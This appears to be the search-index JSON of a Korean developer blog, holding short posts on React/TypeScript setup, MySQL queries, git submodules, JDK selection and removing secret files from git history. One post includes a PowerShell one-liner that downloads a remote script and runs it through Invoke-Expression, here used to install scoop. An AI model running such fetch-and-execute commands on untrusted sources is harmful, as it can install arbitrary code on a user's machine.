.","link":"/2020/10/07/%ED%98%84%EC%9E%AC-%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%EC%97%90%EC%84%9C-cmd%EC%97%B4%EA%B8%B0/"},{"title":"css box-sizing","text":"123* { box-sizing: border-box;} border-box를 많이 쓸 것 같다 참고 https://developer.mozilla.org/ko/docs/Web/CSS/box-sizing border-box, content-box 둘 차이를 시각적으로 알려주는 예제가 있다","link":"/2021/02/21/css-box-sizing/"},{"title":"ts react sass eslint prettier","text":"https://github.com/chinsun9/minecraft-nether-portal-calculator/tree/my-react-template react 시작할 때 편하게 하려고 만듦 내가 사용하려고 만들어둔 템플릿 react + ts + eslint(airbnb) + prettier + sass 필요 없는 테스트 코드 삭제 및 favicon 설정해두었다 리액트로 만들 새로운 앱 초기 설정하는 김에 템플릿으로 만들었다 설정한 순서12345678910npx create-react-app . --template typescript// eslint, prettiernpx install-peerdeps --dev eslint-config-airbnbyarn add -D @typescript-eslint/eslint-plugin @typescript-eslint/parseryarn add -D prettier eslint-config-prettier eslint-plugin-prettier// sass(scss)yarn add node-sassyarn add prettier-plugin-style-order 필요 패키지 설치 package.json123456{ // ... &quot;devDependencies&quot;: { &quot;@typescript-eslint/eslint-plugin&quot;: &quot;^4.15.1&quot;, &quot;@typescript-eslint/parser&quot;: &quot;^4.15.1&quot;, &quot;eslint&quot;: &quot;7.2.0&quot;, // &lt;-- 삭제 react-scripts에서 &quot;eslint&quot;: &quot;^7.11.0&quot;를 사용한다고 수동으로 eslint를 설치하지 말라고 한다. 1yarn package.json 에서 eslint를 삭제하고 yarn으로 종속성을 다시 설치한다 package.json123456789101112131415161718192021222324252627282930313233343536373839{ // ... &quot;eslintConfig&quot;: { &quot;plugins&quot;: [ &quot;react&quot;, &quot;@typescript-eslint&quot; ], &quot;extends&quot;: [ &quot;airbnb&quot;, &quot;airbnb/hooks&quot;, &quot;plugin:@typescript-eslint/recommended&quot;, &quot;prettier&quot;, &quot;prettier/react&quot;, &quot;plugin:prettier/recommended&quot; ], &quot;env&quot;: { &quot;browser&quot;: true, &quot;node&quot;: true }, &quot;parser&quot;: &quot;@typescript-eslint/parser&quot;, &quot;parserOptions&quot;: { &quot;project&quot;: &quot;./tsconfig.json&quot; }, &quot;rules&quot;: { &quot;import/no-unresolved&quot;: &quot;off&quot;, &quot;import/extensions&quot;: &quot;off&quot;, &quot;@typescript-eslint/explicit-module-boundary-types&quot;: &quot;off&quot;, &quot;no-use-before-define&quot;: &quot;off&quot;, &quot;react/jsx-filename-extension&quot;: &quot;off&quot;, &quot;prettier/prettier&quot;: [ &quot;error&quot;, { &quot;endOfLine&quot;: &quot;auto&quot;, &quot;singleQuote&quot;: true, &quot;tabWidth&quot;: 2 } ] } }, package.json 에서 eslint 관련 설정을 해준다 .vscode/settings.json12345678910111213141516{ &quot;typescript.tsdk&quot;: &quot;node_modules\\\\typescript\\\\lib&quot;, // 프리티어 확장도구로 인한 자동 포맷팅 비활성화 &quot;editor.formatOnSave&quot;: false, // 파일 저장시 자동으로 lint 및 포맷팅 &quot;editor.codeActionsOnSave&quot;: { &quot;source.fixAll.eslint&quot;: true }, // css파일에서 저장시 자동으로 포맷팅 &quot;[scss]&quot;: { &quot;editor.formatOnSave&quot;: true }} settings.json 을 설정한다","link":"/2021/02/21/ts-react-sass-eslint-prettier/"},{"title":"git alias로 명령어 줄이기","text":"1git config --global alias.rc 'rm -r --cached .' windows의 경우 git bash를 열어서 위 명령을 실핸한다 이미 원격 저장소에 올린 파일을 gitignore 할 때 쓰는 명령어인데 항상 외우지 않고 복붙 했었는데, 그것도 귀찮아서 이참에 git rc로 줄여버렸다","link":"/2021/02/22/git-alias%EB%A1%9C-%EB%AA%85%EB%A0%B9%EC%96%B4-%EC%A4%84%EC%9D%B4%EA%B8%B0/"},{"title":"mysql 현재시간 구하기","text":"1234567891011121314151617181920212223-- 현재시간 구하기SELECT curtime()-- 07:35:51-- 시간 값만 가져오기 ; %H ; 00~23SELECT date_format(curtime(), '%H')-- 07-- 앞에 0 패딩 없애기 1 ; 숫자를 더해서 캐스팅SELECT date_format(curtime(), '%H') + 0-- 7-- 앞에 0 패딩 없애기 2 ; k로 가져오면 0~23SELECT date_format(curtime(), '%k')-- 7 현재 시간을 얻는 법 참고 https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_date-format","link":"/2021/02/22/mysql-%ED%98%84%EC%9E%AC%EC%8B%9C%EA%B0%84-%EA%B5%AC%ED%95%98%EA%B8%B0/"},{"title":"mysql 버전 확인","text":"12SELECT version()","link":"/2021/02/22/mysql-%EB%B2%84%EC%A0%84-%ED%99%95%EC%9D%B8/"},{"title":"rds 시간대 변경","text":"rds는 기본적으로 utc를 사용한다 한국 시간대로 바꿔보자 하는 법새 파라미터 그룹 생성 rds 생성하면서 자동 생성되는 default.~ 그룹은 수정이 불가하다 따라서 디폴트 파라미터 그룹을 사용한다면 새로이 파라미터 그룹을 생성한다 time zone 파라미터 수정 time_zone을 검색해서 시간대를 수정한다 rds 인스턴스 파라미터 그룹 수정 rds 인스턴스 수정에 들어가서, 위에서 생성한 파라미터 그룹으로 적용시켜준다 rds 재시작 rds를 재시작해야 적용된다 적용 확인하기1SELECT curtime(); 참고 https://aws.amazon.com/ko/premiumsupport/knowledge-center/rds-change-time-zone/","link":"/2021/02/22/rds-%EC%8B%9C%EA%B0%84%EB%8C%80-%EB%B3%80%EA%B2%BD/"},{"title":"mysql datetime칼럼 날짜로 조회하기","text":"1SELECT * FROM commuteLog where companyId=12 and date(commuteDatetime) = curdate(); datetime(YYYY-MM-DD hh:mm:ss)을 date(YYYY-MM-DD) 기준으로 조회하는 방법","link":"/2021/02/23/mysql-datetime%EC%B9%BC%EB%9F%BC-%EB%82%A0%EC%A7%9C%EB%A1%9C-%EC%A1%B0%ED%9A%8C%ED%95%98%EA%B8%B0/"},{"title":"배열에서 가장 큰 값 얻기","text":"123456const numArr = [1, 2, 3];Math.max.apply(null, numArr);// orMath.max(...numArr); 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/Math/max#%EC%98%88%EC%A0%9C https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/Function/apply","link":"/2021/03/12/%EB%B0%B0%EC%97%B4%EC%97%90%EC%84%9C-%EA%B0%80%EC%9E%A5-%ED%81%B0-%EA%B0%92-%EC%96%BB%EA%B8%B0/"},{"title":"202101 검색 실적","text":"","link":"/2021/02/05/202101-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"202102 검색 실적","text":"","link":"/2021/03/03/202102-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"유용한 사이트 - Flat UI Color Palette","text":"🎨 Flat UI Palette v1 | Flat UI Colors 🎨 280 handpicked colors ready for COPY &amp; PASTE https://flatuicolors.com/palette/defo 원하는 색을 클릭하면 클립보드에 복사된다 복사할 때 애니메이션이랑 소리가 재미나다","link":"/2021/04/05/Flat-UI-Color-Palette/"},{"title":"Map을 포함한 Object JSON stringify","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647interface MyType { id: number; cover: string; outComes: Map&lt;number, string&gt;; questions: Map&lt;number, Map&lt;number, string&gt;&gt;;}const stringify = (object: any) =&gt; { for (const eachIdx in object) { if (object[eachIdx] instanceof Map) { object[eachIdx] = Array.from(object[eachIdx]); stringify(object); } else if (typeof object[eachIdx] == 'object') stringify(object[eachIdx]); } return JSON.stringify(object, null, 2);};const jsonString2ObjectWithMap = &lt;ReturnType&gt;( jsonString: string): ReturnType =&gt; { const object = JSON.parse(jsonString); console.log(`-------------변환전`); console.log(object); const jsonstringToObject = (object) =&gt; { for (const eachIdx in object) { if ( object[eachIdx] instanceof Array &amp;&amp; object[eachIdx].length &gt; 0 &amp;&amp; object[eachIdx][0].constructor === Array ) { object[eachIdx] = new Map(object[eachIdx]); jsonstringToObject(object); } else if (typeof object[eachIdx] == 'object') jsonstringToObject(object[eachIdx]); } return object; }; console.log(`-------------변환후`); const result = jsonstringToObject(object); console.log(result); return result;}; 실행123456789101112131415161718192021222324252627282930313233const myObject: MyType = { id: 30, cover: 'cover', outComes: new Map([ [0, 'o1'], [1, 'o2'], ]), questions: new Map([ [ 0, new Map([ [1, 'answer1'], [2, 'ansewr2'], ]), ], [ 1, new Map([ [1, 'ansewr1'], [2, 'ansewr2'], ]), ], [2, new Map([])], ]),};console.log(`-----------------map을 포함한 오브젝트 json stringify`);const rst = stringify(myObject);console.log(rst);console.log(typeof rst);console.log(`-----------------다시 오브젝트화`);const result = jsonString2ObjectWithMap&lt;MyType&gt;(rst); output123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263-----------------map을 포함한 오브젝트 json stringify{ &quot;id&quot;: 30, &quot;cover&quot;: &quot;cover&quot;, &quot;outComes&quot;: [ [ 0, &quot;o1&quot; ], [ 1, &quot;o2&quot; ] ], &quot;questions&quot;: [ [ 0, [ [ 1, &quot;answer1&quot; ], [ 2, &quot;ansewr2&quot; ] ] ], [ 1, [ [ 1, &quot;ansewr1&quot; ], [ 2, &quot;ansewr2&quot; ] ] ], [ 2, [] ] ]}string-----------------다시 오브젝트화-------------변환전{ id: 30, cover: 'cover', outComes: [ [ 0, 'o1' ], [ 1, 'o2' ] ], questions: [ [ 0, [Array] ], [ 1, [Array] ], [ 2, [] ] ]}-------------변환후{ id: 30, cover: 'cover', outComes: Map { 0 =&gt; 'o1', 1 =&gt; 'o2' }, questions: Map { 0 =&gt; [ [Array], [Array] ], 1 =&gt; [ [Array], [Array] ], 2 =&gt; [] }} 상황 서버로 json 형태로 값을 전달하고 싶은데.. Map은 json stringify로 변환되지 않는다 변환하기 위해서는 한번 Array로 변환한 다음에야 가능했다 어떤 객체에 맵이 중첩으로 사용된 경우 수동으로 바꿔주는 게 귀찮다 해결stringify.ts123456789const stringify = (object: any) =&gt; { for (const eachIdx in object) { if (object[eachIdx] instanceof Map) { object[eachIdx] = Array.from(object[eachIdx]); stringify(object); } else if (typeof object[eachIdx] == 'object') stringify(object[eachIdx]); } return JSON.stringify(object, null, 2);}; 객체 안 멤버들을 하나씩 돌아가면서 Map이거나 오브젝트인지 확인한다 Map이면은 JSON stringify 할 수 있는 Array로 변환한다 오브젝트이면 중첩되어있는 Map을 찾기 위해 재귀적으로 반복한다. 사용법 myObject와 같은 중첩 map을 포함하고 있고, 포함되어있는 Map이 Map&lt;number,string&gt; 일 경우에만 때만 테스트해보아서, 더 다양한 경우에도 동작할지는 모르겠다. input : { a:… } 처럼 오브젝트를 넣어야 한다. console.log 찍어봤을 때 { }로 묶여있는… 만약에 그냥 Map인 경우에는 이런 식으로 { a: new Map() } 한번 감싸주면 된다. repo https://github.com/chinsun9/map2json","link":"/2021/03/24/Map%EC%9D%84-%ED%8F%AC%ED%95%A8%ED%95%9C-Object-JSON-stringify/"},{"title":"array to hashmap js","text":"ex112345678910111213141516const arr = [ { id: 1, value: 1 }, { id: 2, value: 2 }, { id: 3, value: 3 },];let map = new Map();arr.reduce((newMap, cur) =&gt; { const { id, value } = cur; newMap.set(id, value); return newMap;}, map);console.log(map);map.get(1); reduce로 합쳐주는 방식으로 할 수 있고 ex2123456789const arr = [ { id: 1, value: 1 }, { id: 2, value: 2 }, { id: 3, value: 3 },];const map = new Map(arr.map((item) =&gt; [item.id, item.value]));console.log(map); array.map()과 Map 생성자로 짧고 이쁘게 변화해줄 수 있다. 참고 https://stackoverflow.com/questions/26264956/convert-object-array-to-hash-map-indexed-by-an-attribute-value-of-the-object","link":"/2021/03/24/array-to-hashmap-js/"},{"title":"emojipedia 이모지 검색해서 찾기","text":"Win + ., Win + ; 단축키로 이모지를 쓸 수 있는 건 좋은데 찾는 게 어렵다 키워드로 원하는 이모지를 검색해보자 사용 예시까지 알려준다 ㅋㅋ 참고 https://emojipedia.org/","link":"/2021/03/25/emojipedia/"},{"title":"git clone 원하는 폴더명","text":"1git clone {레포.git} {폴더명} 폴더명부분을 생략하면 자동으로 레포명으로 생성이 된다 .으로 지정하면 하위 폴더 생성 없이 현재 디렉터리에 클론 된다. 참고 https://stackoverflow.com/questions/651038/how-do-you-clone-a-git-repository-into-a-specific-folder","link":"/2021/03/24/git-clone-%EC%9B%90%ED%95%98%EB%8A%94-%ED%8F%B4%EB%8D%94%EB%AA%85/"},{"title":"layout css","text":"https://1linelayouts.glitch.me/ layout 잡을 때 참고하기 정말 좋은 사이트","link":"/2021/03/26/layout-css/"},{"title":"lorem ipsum HTML만들다가 샘플 텍스트 고민하지 말자","text":"vscode emmet 으로 lorem 을 적으면 자동 완성할 수 있다. 참고 emmet 활성화 ; https://chinsun9.github.io/2020/11/25/react%EC%97%90%EC%84%9C-html-%EC%9E%90%EB%8F%99%EC%99%84%EC%84%B1-%EC%93%B0%EA%B8%B0-emmet-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/","link":"/2021/03/24/lorem-ipsum/"},{"title":"mysql replace 안될 때","text":"ON DUPLICATE KEY 를 사용한다. 1234567891011121314INSERT INTO department ( `departmentId`, `companyId`, `name`, `memo`, `parentId` )VALUES (?, ?, ?, ?, ?,) ON DUPLICATE KEYUPDATE name = ?, memo = ?, parentId = ?; 상황 제약 조건이 걸려있는 pk를 사용하였을 때 replace 사용이 불가해진다 이럴 때 ON DUPLICATE KEY를 사용해서 중복된 키일 때 키를 제외한 나머지 칼럼 값들을 변경할 수 있다 참고 https://tez.kr/161","link":"/2021/03/24/mysql-replace-%EC%95%88%EB%90%A0-%EB%95%8C/"},{"title":"vscode-pandoc 마크다운을 워드파일로 만들기","text":"markdown을 word파일로 예쁘게 만들어준다 목차까지 자동생성되니 아주 좋다 참고 ; 나는 pdf로는 안 만들어져서 word(docx)로 변환 후에 word 열어서 pdf로 저장하는 방식으로 한다. 사용법 F1 &gt; Pandoc Render &gt; docx 해당 마크다운 파일과 같은 경로에 아웃풋(docx)가 생성된다 설치하기 확장도구만 깔고 왜 안돼! 하고있엇다. 2가지를 설치해야한다 확장도구 + pandoc https://pandoc.org/installing.html 위 링크로 들어가 인스톨러를 다운받고 실행해 pandoc을 설치한다 https://marketplace.visualstudio.com/items?itemName=DougFinke.vscode-pandoc vscode를 열고 vscode-pandoc 확장도구를 설치한다 참고 https://pandoc.org/installing.html https://marketplace.visualstudio.com/items?itemName=DougFinke.vscode-pandoc","link":"/2021/03/24/vscode-pandoc/"},{"title":"vscode shell git bash","text":"123456789101112131415161718192021{ // ... &quot;shellLauncher.shells.windows&quot;: [ { &quot;shell&quot;: &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, &quot;label&quot;: &quot;cmd&quot; }, { &quot;shell&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;, &quot;label&quot;: &quot;PowerShell&quot; }, { &quot;shell&quot;: &quot;C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe&quot;, &quot;label&quot;: &quot;Git bash&quot; }, { &quot;shell&quot;: &quot;C:\\\\Windows\\\\System32\\\\bash.exe&quot;, &quot;label&quot;: &quot;WSL Bash&quot; } ]} git bash 터미널을 vscode에 추가하고 싶을 때, shellLauncher 확장도구를 사용해서 위와 같이 각 터미널 실행파일 경로를 지정해주었다 특히 git bash 터미널 경로는 Git/bin/bash.exe이다. 평소에 cmd로 사용하다가 bash 명령어를 쓰고 싶을 때나 git alias 추가할 때 사용한다. F1 &gt; Shell Launcher: Launch &gt; git bash 선택하여 사용한다. 참고 https://marketplace.visualstudio.com/items?itemName=Tyriar.shell-launcher","link":"/2021/03/24/vscode-shell-git-bash/"},{"title":"리액트할 때 사용하는 스니펫","text":"ES7 React/Redux/GraphQL/React-Native snippets 확장도구에서 제공하는 스니펫을 사용한다 리액트12345678// rfce 또는 rfcimport React from &quot;react&quot;;function App() { return &lt;div&gt;&lt;/div&gt;;}export default App; 리액트 네이티브1234567891011// rnfimport React from &quot;react&quot;;import { View, Text } from &quot;react-native&quot;;export default function App() { return ( &lt;View&gt; &lt;Text&gt;&lt;/Text&gt; &lt;/View&gt; );} 참고 https://marketplace.visualstudio.com/items?itemName=dsznajder.es7-react-js-snippets","link":"/2021/03/26/%EB%A6%AC%EC%95%A1%ED%8A%B8%ED%95%A0-%EB%95%8C-%EC%82%AC%EC%9A%A9%ED%95%98%EB%8A%94-%EC%8A%A4%EB%8B%88%ED%8E%AB/"},{"title":"반응속도 테스트 클론코딩","text":"반응속도 테스트를 클론코딩 해봤다 https://simritest.com/reaction https://humanbenchmark.com/tests/reactiontime 기능 반응속도 기록 랜덤 간격 눈 덜 아프게 결과에 따라 다른 메시지 예측 클릭하면 횟수 -1 느낀점 기존 테스트가 색이 확 반전돼서 집중은 해야 하는데 눈이 너무 아팠다 그래서 배경색은 그대로에 초록점이 생기도록 했다 컨텍스트 쓸까 고민하다가 어차피 깊이도 안 깊어서 그냥 prop으로 넘겨줬다. 개선방향공유 버튼 만들기 결과 이미지 생성해서 클립보드 복사해주기 또는 이미지 파일로 저장 구린 css 바꾸기 색을 좀 이쁘게 써보자 레포 https://github.com/chinsun9/reaction-time-test","link":"/2021/03/25/%EB%B0%98%EC%9D%91%EC%86%8D%EB%8F%84-%ED%85%8C%EC%8A%A4%ED%8A%B8-%ED%81%B4%EB%A1%A0%EC%BD%94%EB%94%A9/"},{"title":"특정 자바 버전으로 jar 실행","text":"상황 기존에 사용하던 A.jar 실행파일이 있다 자바 버전을 바꿨다 환경변수 변화로 인해 A.jar이 더 이상 동작하지 않는다 이 실행파일만 기존 자바 버전으로 실행할 수 없을까? 또는 A.jar은 jdk9에서 실행 가능하고 B.jar은 jdk13에서 실행 가능한데, 둘 다 각자의 자바 버전으로 실행하려면 어떻게 해야 할까? 실행파일 만들기ex.bat1234567pushd &quot;%~dp0&quot;&quot;C:\\Program Files\\Java\\jdk-9.0.4\\bin\\java.exe&quot; -versionpause&quot;C:\\Program Files\\Java\\jdk-13.0.2\\bin\\java.exe&quot; -versionpause 각 버전의 자바 파일 경로를 앞에 써준다. -version 옵션을 주어서 원하는 버전의 자바가 실행되는지 확인한다 runA.bat123pushd &quot;%~dp0&quot;&quot;C:\\Program Files\\Java\\jdk-9.0.4\\bin\\java.exe&quot; -jar A.jar 이런 식으로 특정 자바 버전으로 jar을 실행할 수 있겠다. 참고 pushd &quot;%~dp0&quot; ; https://chinsun9.github.io/2020/10/06/cmd-%EA%B4%80%EB%A6%AC%EC%9E%90-%EA%B6%8C%ED%95%9C/","link":"/2021/03/24/%ED%8A%B9%EC%A0%95-%EC%9E%90%EB%B0%94-%EB%B2%84%EC%A0%84%EC%9C%BC%EB%A1%9C-%EC%8B%A4%ED%96%89/"},{"title":"비공개로 작업하던 레포 공개로 전환하기 위해 스크릿 파일 삭제하기","text":"상황 리액트 스터디가 끝났다..! 스터디하면서 github에 비공개 레포로 진행했었는데 스터디를 끝내면서 공개로 전환하기로 했다 하지만 공개로 전환하기 전에 aws를 사용하면서 저장해둔 rds 접속 정보 등 시크릿 파일을 제거해야 한다 히스토리에서도 완전히 삭제하는 것을 목표로 한다 시도1 ; git filter-branch https://docs.github.com/en/github/authenticating-to-github/removing-sensitive-data-from-a-repository#using-filter-branch 위 문서를 보니까 git filter-branch를 사용한다 1git filter-branch --index-filter 'git rm --cached --ignore-unmatch utils\\rdsSecret.ts' HEAD 명령을 실행하니까 filter-repo를 사용하라고 했다 시도2 ; git filter-repo https://github.com/newren/git-filter-repo/blob/main/INSTALL.md git filter-repo는 파이썬이 필요하므로, 파이썬이 설치가 안되어있다면 설치하자 나는 윈도우를 쓰고 있는데, 윈도우에서 인스톨할 때 주의사항이 있었다 scoop을 통해 설치하면 문제없다 하여 scoop을 설치한다 scoop 설치 및 filter-repo 설치 https://scoop.sh/ scoop은 윈도우용 커맨드 라인 인스톨러라고 한다 설치를 위해 파워쉘을 관리자 권한으로 실행하고 다음을 실행한다 123456# scoop 설치Set-ExecutionPolicy RemoteSigned -scope CurrentUserInvoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh')# filter-repo 설치scoop install git-filter-repo filter-repo로 git history 속 민감한 정보 삭제하기12345git filter-repo --invert-paths --path utils/rdsSecret.ts//...git filter-repo --invert-paths --path secret1git filter-repo --invert-paths --path secret2git filter-repo --invert-paths --path secret3 README.md에 민감한 정보가 있는 경우, 기존 내용을 복사했다가 명령어로 히스토리에서 제거하고, 다시 파일을 생성하고 민감한 정보를 없애고 새로 커밋을 해주었다. 이 작업을 진행하면 리모트 주소가 삭제되는데, git remote add {레포 주소} 한다 주의사항 작업을 진행하기 전에 백업 레포를 하나 생성하자 --path 경로 작성할 때, \\로 작성하면 안 되고 /로 작성해야 한다 제거하고자 하는 파일을 이름을 변경한 적이 있던가, 폴더를 이동했었으면 이전의 내역까지 완전히 사라지지 않는다 그래서 수동으로 하나씩 찾아서 해줘야 한다 sourcetree에서 히스토리 검색을 통해서 꼼꼼히 체크하여 삭제를 진행한다 참고 https://docs.github.com/en/github/authenticating-to-github/removing-sensitive-data-from-a-repository https://www.youtube.com/watch?v=Bo-8EfDpKxA https://github.com/newren/git-filter-repo/ https://m.blog.naver.com/PostView.nhn?blogId=chandong83&amp;logNo=221101838350&amp;proxyReferer=https:%2F%2Fwww.google.com%2F // scoop 설치 https://marcofranssen.nl/remove-files-from-git-history-using-git-filter-repo/","link":"/2021/04/13/%EB%B9%84%EA%B3%B5%EA%B0%9C%EB%A1%9C-%EC%9E%91%EC%97%85%ED%95%98%EB%8D%98-%EB%A0%88%ED%8F%AC-%EA%B3%B5%EA%B0%9C%EB%A1%9C-%EC%A0%84%ED%99%98%ED%95%98%EA%B8%B0-%EC%9C%84%ED%95%B4-%EC%8A%A4%ED%81%AC%EB%A6%BF-%ED%8C%8C%EC%9D%BC-%EC%82%AD%EC%A0%9C%ED%95%98%EA%B8%B0/"},{"title":"202103 검색 실적","text":"","link":"/2021/04/13/202103-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"code . 현재창으로 열기","text":"12cd projectcode . vscode 내부 터미널에서 cd 명령을 통해 다른 폴더로 이동한다 해당 폴더를 code .으로 열 수 있다 이 경우에는 새창으로 해당 폴더가 열린다 1code . -r -r옵션을 붙여주면 현재 창을 통해 열리게 된다 이 옵션을 자주 쓸 것 같다 참고 https://code.visualstudio.com/docs/editor/command-line#_core-cli-options","link":"/2021/04/14/code-%ED%98%84%EC%9E%AC%EC%B0%BD%EC%9C%BC%EB%A1%9C-%EC%97%B4%EA%B8%B0/"},{"title":"git submodule 중첩된 깃 사용하기","text":"깃 아래 깃..! 상황12345super├── client│ └── 1└── server └── 1 이런 구조의 프로젝트가 있다 super에서 git init 하여 프로젝트를 관리하다 보면 깃 히스토리가 client 내용, server 내용이 합쳐져 있다 구분하기 위해 커밋 메시지를 적을 때도 어떻게 적어야 할지 망설이게 된다 그래서 super, client, server에 모두 git init하고 super에서는 client와 server를 gitignore에 추가하고 사용해봤는데, 이것도 좋은 방법은 아닌 것 같았다. 그래서 nested git repository 라는 키워드로 검색했고 submodule 이라는 것을 사용하면 된다는 것을 알게 되었다 submodule을 사용하면 super 디렉터리에서 명령어 하나로 하위의 서브모듈 깃 프로젝트를 업데이트(pull) 할 수 있다 공부 생활코딩님의 강의를 보고 공부했다 123456789101112131415161718// 전제조건// 명령어를 실행하는 위치는 super 디렉터리이다// submodule로 추가할 프로젝트(client, server)는 모두 git init으로 초기화된 깃 프로젝트이며 원격 저장소에 올라가 있어야 한다// submodule 추가 // 처음 super에 서브모듈을 추가하는 과정이다git submodule add {repo url} 디렉터리명// 이후 다른 컴퓨터에서 super를 클론하는 경우git clone {super-repo-url} // git clone https://github.com/chinsun9/super.git// 하위 서브 모듈은 클론되지 않는다// 서브 모듈도 가져오기git submodule initgit submodule update// 위 명령은 하위 모든 서브 모듈을 가져온다// 특정 서브 모듈만 가져오고 싶다면git submodule init {submodule명} super에서는 하위 서브모듈의 변경을 감지하고, 하위 모듈의 해시(특정 버전을 가리키는)를 기억하는 방식으로 관리된다 git submodule update 명령을 사용하여 super에서 저장하고 있는 특정 버전의 하위 모듈로 업데이트한다 git submodule update --remote 명령을 사용하여 각 하위 모듈을 최신 상태로 업데이트할 수 있다 여러 컴퓨터에서 작업할 때 super를 클론하고 git pull &amp;&amp; git submodule update 명령으로 한 번에 가져올 수 있겠다! 발생한 문제123456git submodule update --remotefatal: Needed a single revisionUnable to find current https://github.com/chinsun9/my-submodule/master revision in submodule path 'lib'error Command failed with exit code 1.info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command. git submodule update --remote 명령을 실행하니 이런 에러가 발생했다. 나는 submodule을 알기 전에 그냥 하위에 또 다른 깃 디렉터리를 사용하고 있었는데, 그 상태 그대로 submodule add하고 사용했더니 위 에러가 발생했다 해결방법은 기존 하위 레포를 삭제하고 다시 git submodule update --remote를 실행한다 12rm -rf lib/git submodule update --remote 혹시 특정 브랜치에 대해 가져오고 싶으면 .gitmodules 파일을 열고 branch 값을 명시해준다 12345678910// 수정 전[submodule &quot;client&quot;] path = client url = https://github.com/chinsun9/my-submodule// 수정 후[submodule &quot;client&quot;] path = client branch = mybranchname // 추가됨! url = https://github.com/chinsun9/my-submodule 참고 https://youtu.be/TAe4uZqYt6c","link":"/2021/04/14/git-submodule-%EC%A4%91%EC%B2%A9%EB%90%9C-%EA%B9%83-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"gradle build 특정 jdk 버전으로","text":"상황 내 컴퓨터에는 여러 가지 자바 버전이 설치되어있다. (jdk1.8.0_281, jdk-13.0.2) 자바 버전 1.8에서 동작하는 runable jar 파일을 만드는데, 1.8에서 실행이 안되었다 그래들 프로젝트이다 분명 프로젝트 세팅은 1.8로 되어있는데 막상 빌드 결과물 jar이 1.8에서 실행이 안되었다 그런데 13에서 실행이 되는 것을 확인하고, 빌드가 다른 자바 버전으로 되는 것을 확인했다 error message1Error: A JNI Error has occurred, ... has been compiled by a more recent version of the java runtime 해결1gradlew build -Dorg.gradle.java.home=&quot;C:\\Program Files\\Java\\jdk1.8.0_281&quot; 빌드할 때 자바 홈을 명시해 주었더니 해결되었다 참고 https://stackoverflow.com/a/66795979","link":"/2021/04/22/gradle-build-%ED%8A%B9%EC%A0%95-jdk-%EB%B2%84%EC%A0%84%EC%9C%BC%EB%A1%9C/"},{"title":"taskkill -jar","text":"상황 java -jar로 runable jar을 실행할 수 있다 그런데 이 jar을 cmd로 종료할 수 없을까? 보통의 프로그램이라면 taskkill /F /IM로 프로세스 이름을 통해 종료할 수 있다 근데 java -jar 실행한 앱의 경우, 프로세스명이 java.exe, javaw.exe 정도이다 해결 jps 명령으로 .jar 파일 이름을 통해 PID를 얻을 수 있다 jps는 jdk가 설치되어있고 환경 변수만 잘 설정되어있다면 그냥 동작한다 example.bat12rem examplefor /f &quot;tokens=1&quot; %i in ('jps -m ^| find &quot;myApp&quot;') do ( taskkill /F /PID %i ) find “myApp” 부분에 jar 파일 명을 적으면 된다 jar 파일명을 완전히 적지 않아도 된다 참고 https://yannickloriot.com/2012/08/kill-a-java-process-from-the-command-line-or-a-bat-file/","link":"/2021/04/23/taskkill-jar/"},{"title":"내가 타입스크립트를 쓰는 이유","text":"타입스크립트 입문 전 C, C++, JAVA를 학교 수업으로 들었다 3,4 학년 때는 웹 프로그래밍을 많이 하면서 백엔드는 nodejs, 프론트는 ejs를 했었다 nodejs 위에서 js를 쓰면서 이것저것 쓰면서 익숙해지고 있었다 자바스크립트는 공부해서 했기보다는 그냥 막히는 부분마다 검색해서 해결했었다 for문도 그냥 array api(foreach, map, reduce) 안 쓰고 for(;;)로 다 짜고.. 그당시 내가 느끼기로 자바스크립트는 C나 JAVA에 없는 괴랄한 문법이 많이 있었다 그런거에 흥미를 가지면서 for(;;) 쓰는거 그만하고 js스러운 코드를 짜기 시작했었던 같다 또 js는 여태껏 배워온 C나 JAVA와 다르게 타입에 전혀 얽매이지 않고, 웬만하면 에러없이 동작해서 엄청 편했다 타입스크립트 입문 동기 ts를 한번 쓰면 못 빠져나온다는 조언을 들음 (그만큼 좋다) 타입스크립트 첫인상 기존에 배웠던 엄격한 언어들과는 다르게 js는 엄청 유연한? 언어였다 나는 이런 특성이 편하게 다가왔다 타입 때문에 골머리 아프지 않아도 돼서 뭔가 해방된 느낌이 들었기 때문이다 그런데 타입스크립트라고 자바스크립트에서 굳이 타입을 붙여 써서 뭐가 좋아지는지 왜 다시 역행하는지에 대해 약간 의문이 있었다 실제로 시작해서도 그간 타입을 명시하지 않았던 편안함을 잃은 기분이었다 타입스크립트를 쓰면… 1 + ‘1’// ‘11’ 숫자+숫자로 예상했는데 실제론 숫자+문자열하는 일은 안 겪어되는 것부터 해서 실행 전에 에러를 잡아 준다는데,, 그거야 처음에 잘 짜면 되는 것을,, 이때는 공감하지 못했다. 내가 생각하는 타입스크립트 장점7개월 차 (20년 9월 - 21년 4월) 타입스크립트는 짱이다 위에서 말한 타입스크립트를 쓰는 일반적인 장점이 있지만, 나는 이 장점 다 필요 없고 자동완성이 100% 보장된다는 점에서 타입스크립트를 좋아한다 예를 들면 그냥 js를 쓸 때는 배열 변수에 . 찍어도 array api 자동완성이 안된다 위가 js고 아래가 ts다 위는 그냥 arr 변수가 배열이든 아니든 그냥 스니펫만 제공하는 반면 아래 ts의 경우 배열 타입에 맞춰서 그에 맞는 array api를 자동완성해주는 모습이다 이 정도까지는 그냥 코드 스니펫으로 해결할 수 있는 수준이지만 이런 api 자동완성은 기본이고, 어떤 클래스나 객체를 생성해서 하위에 멤버 변수가 있을 때 .만 찍으면 전부 자동완성 해준다. 오타로 인해 삽질할 필요가 전혀없는거다 